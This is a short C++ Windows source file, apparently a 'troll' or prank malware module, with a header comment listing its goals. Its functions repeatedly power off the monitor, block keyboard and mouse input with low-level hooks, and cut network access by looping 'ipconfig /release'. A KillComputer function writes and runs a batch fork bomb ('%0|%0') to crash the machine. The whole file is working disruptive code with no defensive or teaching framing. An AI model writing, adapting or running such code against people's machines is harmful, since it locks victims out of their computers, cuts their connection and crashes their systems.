/*
TROLL:
block entire screen [ok]
block input [ok]
play sound
turn off internet [ok]
spawn a process which kills the entire computer [ok]
*/

#include <iostream>
#include <windows.h>
#include <iphlpapi.h>
#include <powrprof.h>
#include <fstream>

#pragma once

void BlockScreen(int seconds) {
    for (int i = 0; i != seconds; i++) {
        PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
        Sleep(1000);
    }
}

LRESULT CALLBACK BlockProc(int _, WPARAM __, LPARAM ___) {
    return 1;
}

void BlockUserInput(int seconds) {
    HHOOK hKeyboard;
    HHOOK hMouse;
    for (int i = 0; i != seconds * 10; i++)
    {
        hKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, BlockProc, NULL, 0);
        hMouse = SetWindowsHookEx(WH_MOUSE_LL, BlockProc, NULL, 0);
        Sleep(100);
        UnhookWindowsHookEx(hKeyboard);
        UnhookWindowsHookEx(hMouse);
    }
}

void KillInternet(int seconds) {
    for (int i = 0; i != seconds * 10; i++) {
        system("ipconfig /release");
        Sleep(100);
    }
    system("ipconfig /renew");
}

void KillComputer() {
    std::ofstream pWrite("g.bat");
    pWrite << "%0|%0";
    pWrite.close();
    system("g.bat");
}